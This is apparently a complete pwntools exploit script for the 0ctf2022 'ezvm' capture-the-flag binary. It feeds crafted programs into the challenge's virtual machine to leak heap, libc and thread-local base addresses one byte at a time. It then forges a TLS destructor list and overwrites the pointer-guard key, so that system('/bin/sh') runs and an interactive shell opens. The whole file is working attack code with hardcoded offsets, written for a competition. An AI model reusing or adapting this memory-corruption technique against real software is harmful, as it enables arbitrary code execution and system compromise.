from pwn import *
from assembler import *


def run_vm(prog, mem_count, msg):
    assembler = Assembler(prog)
    code = assembler.assemble(debug=False)
    p.sendlineafter(b"Please input your code size:\n", b"%d" % len(code))
    p.sendlineafter(b"Please input your memory count:\n", b"%d" % mem_count)
    p.sendafter(b"Please input your code:\n", code)
    out = p.recvuntil(b"finish!\n")
    p.sendlineafter(b"continue?\n", msg)
    return out


def leak(p, mem_size, num_bytes):
    leak_byte = """
lq r0 0
push r0
li r3 {byte_idx}
push r3
shr
pop r3
push r3
li r1 0xff
push r1
and
pop r1
li r2 0x1
.loop
push r1
push r2
sub
pop r1
push r1
jnz .loop
hlt
    """
    leaked_bytes = []
    for x in range(num_bytes):
        prog = leak_byte.format(byte_idx=x*8)
        output = run_vm(prog, mem_size, b"B"*10).decode("utf-8").strip()
        leaked_byte = output.split("\n").count("what???")
        leaked_bytes = [leaked_byte] + leaked_bytes

    leaked_addr = 0
    for x in leaked_bytes:
        leaked_addr = (leaked_addr << 8) + x

    log.success(f"Leaked value : {hex(leaked_addr)}")
    return leaked_addr


def exploit(p, heap_base, fs_base, libc_base):
    system = libc_base + 0x50d60
    binsh = libc_base + 0x1d8698
    log.success(f"system @ {hex(system)}")
    log.success(f"binsh @ {hex(binsh)}")

    heap_chunk = heap_base + 0x390 + 0x40
    log.success(f"fake tls list at {hex(heap_chunk)}")

    xor_key = fs_base + 0x30
    tls_dtors_list = fs_base - 0x58

    log.success(f"xor_key @ {hex(xor_key)}")
    log.success(f"tls_dtors_list @ {hex(tls_dtors_list)}")

    payload = f"""
li r0 {system << 0x11}
li r1 {binsh}
li r2 {heap_chunk}
sq r0 6
sq r1 7
sq r2 {(tls_dtors_list-(heap_chunk-0x30))//8}
sq r3 {(xor_key-(heap_chunk-0x30))//8}
"""
    run_vm(payload, 0x2000000000000000 | 0x100, b"C"*10)
    
    p.sendlineafter(b"Please input your code size:\n", b"1024")


def main(p):
    payload = b"A"*128
    p.sendlineafter(b"Welcome to 0ctf2022!!", payload)

    run_vm("nop\n"*3, 4, b"B"*10)
    heap_base = leak(p, mem_size=4, num_bytes=5) << 12

    run_vm("nop\n"*3, 0x100, b"B"*10)
    libc_leak = leak(p, mem_size=0x100, num_bytes=6)

    libc_base = libc_leak - 0x219ce0

    fs_base = libc_leak - 0x21c5a0
    log.success(f"Leaked fs at {hex(fs_base)}")

    # gdb.attach(p, '''
    # set $base=0x00555555554000
    # set $code=$base+0x5040
    # set $regs=$base+0x5048
    # set $stack=$base+0x5050
    # set $mem=$base+0x5068
    # # bug
    # # b *$base + 0x2366
    # # run_vm
    # # b *$base + 0x151A
    # # free_vm
    # # b *$base + 0x14E2
    # # vm_loop
    # b *0x555555556269
    # ''')

    exploit(p, heap_base, fs_base, libc_base)


if __name__ == '__main__':
    p = process("./ezvm")
    main(p)
    p.interactive()
